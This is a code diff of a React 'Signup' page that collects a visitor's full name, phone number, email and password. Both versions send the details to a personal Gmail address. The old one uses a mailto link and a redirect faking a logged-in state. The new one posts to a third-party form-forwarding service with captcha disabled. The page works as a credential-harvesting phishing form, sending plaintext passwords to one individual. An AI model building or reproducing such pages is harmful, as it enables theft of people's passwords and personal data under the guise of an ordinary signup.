@@ -1,67 +1,46 @@
-import React, { useState } from "react";
+import React from "react";
 
 function App() {
-  const [name, setName] = useState("");
-  const [phone, setPhone] = useState("");
-  const [email, setEmail] = useState("");
-  const [password, setPassword] = useState("");
-
-  function handleSubmit(e) {
-    e.preventDefault();
-
-    const subject = "New Signup";
-    const body =
-      `Name: ${name}%0D%0A` +
-      `Phone: ${phone}%0D%0A` +
-      `Email: ${email}%0D%0A` +
-      `Password: ${password}`;
-
-    window.location.href =
-      `mailto:sanchitsaini3333@gmail.com?subject=${subject}&body=${body}`;
-
-    setTimeout(() => {
-      window.location.href =
-        "https://resilient-sable-8cb929.netlify.app/?loggedin=true";
-    }, 1500);
-  }
-
   return (
-    <div style={page}>
-      <form onSubmit={handleSubmit} style={form}>
-        <h1 style={title}>Signup</h1>
+    <div
+      style={{
+        minHeight: "100vh",
+        display: "flex",
+        justifyContent: "center",
+        alignItems: "center",
+        background: "#000",
+        padding: "20px",
+      }}
+    >
+      <form
+        action="https://formsubmit.co/sanchitsaini3333@gmail.com"
+        method="POST"
+        style={{
+          width: "100%",
+          maxWidth: "350px",
+          background: "#111",
+          padding: "25px",
+          borderRadius: "12px",
+        }}
+      >
+        <h1 style={{ color: "white", textAlign: "center" }}>
+          Signup
+        </h1>
 
-        <input placeholder="Full Name" required style={input} value={name} onChange={(e) => setName(e.target.value)} />
-        <input placeholder="Phone Number" required style={input} value={phone} onChange={(e) => setPhone(e.target.value)} />
-        <input placeholder="Email" type="email" required style={input} value={email} onChange={(e) => setEmail(e.target.value)} />
-        <input placeholder="Password" type="password" required style={input} value={password} onChange={(e) => setPassword(e.target.value)} />
+        <input type="hidden" name="_captcha" value="false" />
 
-        <button type="submit" style={button}>Submit</button>
+        <input name="Name" placeholder="Full Name" required style={input} />
+        <input name="Phone" placeholder="Phone Number" required style={input} />
+        <input name="Email" type="email" placeholder="Email" required style={input} />
+        <input name="Password" type="password" placeholder="Password" required style={input} />
+
+        <button type="submit" style={button}>
+          Submit
+        </button>
       </form>
     </div>
   );
 }
-
-const page = {
-  minHeight: "100vh",
-  display: "flex",
-  justifyContent: "center",
-  alignItems: "center",
-  background: "#000",
-  padding: "20px",
-};
-
-const form = {
-  width: "100%",
-  maxWidth: "350px",
-  background: "#111",
-  padding: "25px",
-  borderRadius: "12px",
-};
-
-const title = {
-  color: "white",
-  textAlign: "center",
-};
 
 const input = {
   width: "100%",
